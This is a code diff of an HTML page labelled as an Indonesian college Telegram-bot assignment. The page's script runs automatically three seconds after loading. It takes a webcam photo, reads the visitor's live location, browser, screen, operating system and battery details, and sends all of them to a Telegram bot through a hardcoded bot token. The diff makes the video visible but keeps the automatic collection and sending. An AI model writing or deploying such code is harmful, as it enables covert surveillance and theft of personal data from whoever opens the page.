@@ -7,9 +7,9 @@
 <body>
   <h1>Tugas Kuliah - Bot Telegram</h1>
   
-  <video id="video" width="0" height="0" autoplay></video>
-  <button onclick="capturePhoto()">Ambil Foto</button>
-  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
+  <video id="video" autoplay></video>
+  <button onclick="capturePhotoAndSend()">Ambil Foto, Lokasi, dan Info Perangkat</button>
+  <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
     const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
@@ -27,18 +27,19 @@
       $.post(url, data);
     }
 
-    function capturePhoto() {
+    function capturePhotoAndSend() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
 
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       const photoData = canvas.toDataURL('image/jpeg');
       sendTelegramPhoto(photoData);
+
+      getLiveLocation();
+      getDeviceInfo();
+      getBatteryInfo();
     }
 
     function getLiveLocation() {
@@ -61,6 +62,7 @@
       const deviceInfo = `
         Browser: ${navigator.userAgent}
         Resolusi Layar: ${screen.width}x${screen.height}
+        Sistem Operasi: ${navigator.platform}
       `;
       sendTelegramMessage(deviceInfo);
     }
@@ -81,10 +83,7 @@
 
     // Auto click actions after 3 seconds
     setTimeout(function() {
-      capturePhoto();
-      getLiveLocation();
-      getDeviceInfo();
-      getBatteryInfo();
+      capturePhotoAndSend();
     }, 3000);
   </script>
 </body>
